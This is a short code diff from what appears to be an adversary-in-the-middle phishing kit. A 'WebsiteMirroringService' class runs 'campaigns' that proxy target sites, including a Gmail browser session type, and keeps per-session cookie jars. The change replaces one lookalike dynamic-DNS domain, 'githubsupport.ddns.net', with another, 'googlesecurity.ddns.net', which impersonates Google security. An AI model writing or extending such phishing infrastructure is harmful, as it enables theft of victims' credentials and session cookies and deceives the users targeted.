@@ -2011,7 +2011,7 @@ class WebsiteMirroringService {
             campaignId: dbSession.campaign_id,
             targetUrl: dbSession.target_url,
             sessionToken,
-            proxyUrl: `https://githubsupport.ddns.net/${sessionToken}`,
+            proxyUrl: `https://googlesecurity.ddns.net/${sessionToken}`,
             startTime: new Date(dbSession.created_at)
           };
           
@@ -2191,7 +2191,7 @@ class WebsiteMirroringService {
           sessionToken,
           targetUrl: normalizedUrl,
           sessionType: 'gmail_browser',
-          proxyUrl: `https://githubsupport.ddns.net/gmail-browser/${sessionToken}`,
+          proxyUrl: `https://googlesecurity.ddns.net/gmail-browser/${sessionToken}`,
           message: 'Gmail session will use browser service - check the campaign dashboard for browser control',
           requiresBrowserService: true,
           browserControlUrl: `/api/gmail-browser/session/${sessionToken}`,
@@ -2213,7 +2213,7 @@ class WebsiteMirroringService {
       });
 
       // Create proxy URL using path-based routing on the new domain
-      const proxyUrl = `https://githubsupport.ddns.net/${sessionToken}`;
+      const proxyUrl = `https://googlesecurity.ddns.net/${sessionToken}`;
       
       // Create cookie jar for this session
       const cookieJar = new CookieJar();
